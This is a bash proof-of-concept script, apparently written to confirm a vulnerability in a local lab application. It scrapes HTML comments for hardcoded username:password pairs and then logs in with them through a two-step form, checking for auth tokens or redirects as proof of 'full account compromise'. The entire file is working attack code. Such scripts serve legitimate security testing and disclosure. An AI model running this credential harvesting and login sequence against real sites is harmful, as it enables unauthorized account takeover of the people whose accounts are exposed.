#!/bin/bash

# POC: Hardcoded Credentials in HTML Comments
# This script demonstrates the discovery and exploitation of hardcoded credentials
# exposed in HTML comments in the application source code

TARGET_URL="http://localhost:8080"
CREDENTIALS_FILE="/tmp/credentials_found.txt"

echo "======================================"
echo "POC: Hardcoded Credentials in HTML Comments"
echo "======================================"
echo ""

# Step 1: Fetch the HTML and extract credentials from comments
echo "[*] Step 1: Fetching HTML source code and searching for credentials in comments..."
HTML_RESPONSE=$(curl -s "$TARGET_URL")

# Extract HTML comments containing credentials
COMMENTS=$(echo "$HTML_RESPONSE" | grep -o '<!--[^-]*-->' | grep -i "password\|credential\|account\|test\|todo")

if [ -z "$COMMENTS" ]; then
    echo "[-] No credentials found in HTML comments"
    exit 1
fi

echo "[+] Found HTML comments:"
echo "$COMMENTS"
echo ""

# Extract credentials from the comment
# Looking for pattern like "username:password" or "username (username:password)"
CREDENTIALS=$(echo "$COMMENTS" | grep -oP '(?<=\()\w+:\w+(?=\))' | head -1)

if [ -z "$CREDENTIALS" ]; then
    # Try alternative pattern
    CREDENTIALS=$(echo "$COMMENTS" | grep -oP '\w+:\w+' | head -1)
fi

if [ -z "$CREDENTIALS" ]; then
    echo "[-] Unable to extract credentials from comments"
    exit 1
fi

echo "[+] Extracted credentials: $CREDENTIALS"
USERNAME=$(echo "$CREDENTIALS" | cut -d':' -f1)
PASSWORD=$(echo "$CREDENTIALS" | cut -d':' -f2)
echo "[+] Username: $USERNAME"
echo "[+] Password: $PASSWORD"
echo ""

# Step 2: Verify credentials by attempting to use them
echo "[*] Step 2: Verifying extracted credentials against the login endpoint..."

# First, attempt login with the credentials
LOGIN_RESPONSE=$(curl -s -c /tmp/cookies.txt -d "username=$USERNAME" "$TARGET_URL")

# Check if we progressed to password stage (valid username)
if echo "$LOGIN_RESPONSE" | grep -q "password"; then
    echo "[+] Username '$USERNAME' is valid (progressed to password entry stage)"
else
    echo "[-] Username not found or unexpected response"
    exit 1
fi

# Now submit the password
PASSWORD_RESPONSE=$(curl -s -b /tmp/cookies.txt -d "password=$PASSWORD" "$TARGET_URL/password/$USERNAME")

# Check for successful authentication indicators
if echo "$PASSWORD_RESPONSE" | grep -q "dashboard\|user\|authenticated\|success\|auth_token" || echo "$PASSWORD_RESPONSE" | grep -q "Set-Cookie.*auth_token"; then
    echo "[+] Password is valid! Credentials '$USERNAME:$PASSWORD' successfully authenticated"
    echo "[+] VULNERABILITY CONFIRMED: Hardcoded credentials work for account access"
    echo ""
    echo "[+] Checking for auth tokens in response..."
    if echo "$PASSWORD_RESPONSE" | grep -q "auth_token"; then
        echo "[+] Authentication token received - full account compromise possible"
    fi
else
    # Check HTTP response for redirect or other success indicators
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -b /tmp/cookies.txt -d "password=$PASSWORD" "$TARGET_URL/password/$USERNAME")
    if [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "301" ]; then
        echo "[+] Password accepted (HTTP $HTTP_CODE redirect - success indicator)"
        echo "[+] VULNERABILITY CONFIRMED: Hardcoded credentials work for account access"
    else
        echo "[!] Unexpected response code: $HTTP_CODE"
        exit 1
    fi
fi

echo ""
echo "[+] POC COMPLETE: Credentials exposed in HTML comments can be used for authentication"

# Cleanup
rm -f /tmp/cookies.txt
exit 0